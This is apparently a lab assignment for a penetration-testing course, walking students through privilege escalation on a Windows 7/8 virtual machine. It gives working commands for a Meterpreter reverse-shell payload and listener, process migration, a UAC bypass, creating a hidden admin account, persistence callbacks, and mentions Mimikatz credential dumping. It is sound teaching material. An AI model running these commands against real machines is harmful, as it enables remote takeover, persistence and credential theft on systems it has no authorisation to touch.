**Privilege Escalation Task**

**Objective**  
Escalate privileges on a Windows 7 or Windows 8 machine by identifying vulnerabilities and exploiting them to gain administrator or system-level access.

**Requirements**  
- Kali Linux virtual machine (Metasploit, PowerSploit, and Windows Exploit Suggester)
- Windows 7 or Windows 8 virtual machine (standard user account)
- Virtual environment (VirtualBox or VMware with NAT/Host-Only Network)
- Required tools:
  - Metasploit Framework
  - Windows Exploit Suggester
  - PowerShell scripts (PowerUp, Invoke-AllChecks)

---

### **Part 1: Gaining Initial Access**

1. **Generate a Meterpreter Reverse Shell Payload** using msfvenom:
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe > shell.exe
   ```
2. **Deliver the Payload** to the Windows machine through any method such as:
   - USB drive (simulated)
   - Social engineering (simulated)
   - Execution via PowerShell
   - Expose it to internet using apache2
3. **Set Up a Listener in Metasploit:**
   ```
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <Kali_IP>
   set LPORT 4444
   exploit -j
   ```
4. **Execute the Payload on Windows 7/8** and establish a connection.

---

### **Part 2: Privilege Escalation**

#### **Step 1: Identify Privileges**
Inside Meterpreter, check the current user:
```
getuid
```
Check system information:
```
sysinfo
```

#### **Step 2: Use Automated Privilege Escalation Tools**

**Option 1: Metasploit GetSystem**
```
use post/windows/escalate/getsystem
run
```

**Option 2: Migrate to a High-Privilege Process**
1. List running processes:
   ```
   ps
   ```
2. Identify a process owned by SYSTEM (e.g., winlogon.exe, lsass.exe).
3. Migrate into the process:
   ```
   migrate <PID>
   ```
4. Verify privilege level:
   ```
   getuid
   ```

**Option 3: PowerShell Privilege Escalation (Manual)**
1. Upload and execute PowerUp:
   ```
   upload /usr/share/windows-resources/powerup.ps1 C:\\Users\\Public\\powerup.ps1
   ```
   ```
   powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\powerup.ps1
   ```
2. Identify misconfigured services, unquoted service paths, or DLL hijacking opportunities.

#### **Step 3: Exploit a Local Vulnerability**
1. On Kali, download the Windows Exploit Suggester:
   ```
   git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
   ```
2. Collect Windows system information:
   ```
   systeminfo > win7info.txt
   ```
3. Run the exploit suggester:
   ```
   python windows-exploit-suggester.py -i win7info.txt -d exploits.csv
   ```
4. Identify a suitable exploit (e.g., CVE-2016-0099) and execute it.

#### **Step 4: Bypass UAC (User Account Control)**
If the user is in the Administrators group but blocked by UAC, try:
```
use exploit/windows/local/bypassuac
set SESSION 1
exploit
```

---

### **Part 3: Post-Exploitation**

1. **Create a New Admin User:**
   ```
   net user hacker P@ssw0rd /add
   net localgroup administrators hacker /add
   ```
2. **Set Up Persistence:**
   ```
   run persistence -U -i 5 -p 4444 -r <Kali_IP>
   ```

---

### **Evaluation Criteria**
You will be assessed based on the following criteria:
- Successfully gaining initial access to the Windows 7/8 machine.
- Using at least two different privilege escalation techniques.
- Documenting each step taken and explaining obstacles encountered.
- Demonstrating post-exploitation tasks such as creating a new user and establishing persistence.

---

### **Bonus Challenges**
- Exploit unquoted service paths.
- Perform DLL hijacking.
- Set up scheduled tasks for persistence.
- Use Mimikatz for credential dumping.
